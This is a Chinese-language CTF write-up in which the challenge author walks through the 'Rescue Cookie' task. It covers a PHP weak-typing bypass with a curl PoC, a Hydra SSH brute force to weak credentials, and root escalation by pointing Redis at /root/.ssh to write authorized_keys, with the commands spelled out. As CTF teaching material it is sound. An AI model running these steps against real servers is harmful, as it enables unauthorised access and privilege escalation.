# 【CTF 攻略】ISC2017 DEFCON GROUP 解救Cookie Write-Up

##### 译文声明
本文为翻译文章，原文来自知乎（zhihu.com）。译文仅供参考，具体表达及含义请以原文为准。

## 0x00 写在前面
这道题是我设计的，主要是为了支持朋友并尝试出题。然而，由于我在大数据与威胁分析论坛上的另一个议题，导致题目中的“柴总爱犬”被多关了24小时，在此深表歉意。请大家不要急于给我寄刀片，我拒收任何快递，得意.jpg。

题目本身是一道披着CTF外衣但实际上考察渗透测试和入侵检测技能的题目。许多参赛者卡在了初始阶段，甚至有高手首次攻破VMware时也遇到了困难（其实这事儿赖我）。

解题思路如下：
1. Google Hacking
2. 代码审计（可以绕过）
3. SSH暴力破解
4. Redis提权写入SSH密钥
5. 修改文件
6. 开锁

## 0x01 隐写题目
虽然题目表面上是考察隐写术，但实际上是在考察大家利用搜索引擎解决问题的能力。之前在比赛中已经提示过：使用最简单直接的方法解决问题。通过谷歌/百度/360搜索“隐写在线工具”，可以找到解密工具。例如，[图片隐写术加密/解密 - aTool在线工具](http://www.atool.org/steganography.php)。下载图片后，使用该工具解密即可获得Flag。

## 0x02 代码审计
这是一个送分题，通过弱类型漏洞可以直接获取flag。示例PoC：

```bash
curl "http://sweeperssl.synology.me:8081/index.php?pass1%5B1%5D=123&pass2%5B%5D=123&nsukey=hxOXBF7yMVWo5%2BZfUhvr6m%2FaT4vDgA7gIiIarcM8JfOtyRB3OmxCzjclJkiNmjtjxD8wTaA%2FLPvUFhW64xKXkDbjaJhwsbWRlDAeIuYI2B0RHi4oWAmJGg1ajGlYHZ3bXJAo%2BSHAMjKZ%2BqeThcytW%2FoHhaSzD0tlXe%2B49LqheWVou3lIBHNJRR07%2Fh3FaNbK"
```

提示：仔细阅读题目，可以发现913端口是SSH端口（明天即9月13日OpenSSH会发布一个弱口令漏洞）。使用Hydra进行爆破，可得到服务器弱口令admin/admin。由于这是送分题，因此可以绕过。

## 0x03 SSH爆破/远程登录
SSH爆破过程不再赘述，获取到服务器密码后，可以通过以下命令远程登录服务器：

```bash
ssh PI:EMAIL -p 913
```

登录后，查找flag文件：

```bash
find / -name lockcommand
Output: /tmp/flag/lockcommand
```

## 0x04 写入 & 提权
我们找到了flag位于`/tmp/flag`目录下，但使用`ls -alh`可以看到flag的所有者是root。此时尝试sudo会发现sudo已被禁用。

查看开放端口：

```bash
netstat -ano
```

发现`127.0.0.1:62379`端口开着，进一步检查服务：

```bash
ps -ef|grep 62379
Output: redis-server 127.0.0.1:62379
```

尝试连接Redis：

```bash
redis-cli -p 62379
```

发现Redis不仅没有对外开放，还设置了认证。查找配置文件：

```bash
find / -name redis.conf
Output: /usr/bin/redis/redis.conf
```

查看密码：

```bash
cat /usr/bin/redis/redis.conf |grep requirepass
Output: #requirepass password
cat /usr/bin/redis/redis.conf |grep Port
Output: Port 6379
```

发现配置文件中Port是6379，而不是62379。实际的配置文件在`/usr/sbin/redis.conf`下。获取Redis密码后，生成SSH密钥并上传：

```bash
ssh-keygen -t rsa -C fxckU
cd ~/.ssh
(echo -e 'nn';cat id_rsa.pub;echo -e "nn") > foo.txt
scp foo.txt -P 913 PI:EMAIL:foo.txt
```

另一台机器上操作：

```bash
redis-cli -p 62379 -a cookie@dc010 flushall
redis-cli -p 62379 -a cookie@dc010 -x config set dir /root/.ssh
redis-cli -p 62379 -a cookie@dc010 -x config set dbfilename authorized_keys
redis-cli -p 62379 -a cookie@dc010 save
cat foo.txt| redis-cli -p 62379 -a cookie@dc010 -x set crackit
cat foo.txt| redis-cli -p 62379 -a cookie@dc010 save
```

最后，使用新生成的密钥登录：

```bash
ssh -i id_rsa PI:EMAIL -p 913
echo unlock > /tmp/flag/lockcommand
```

至此，Cookie被成功解救！

最后再次强调，请大家不要给我寄刀片，有话好好说，facepalm.png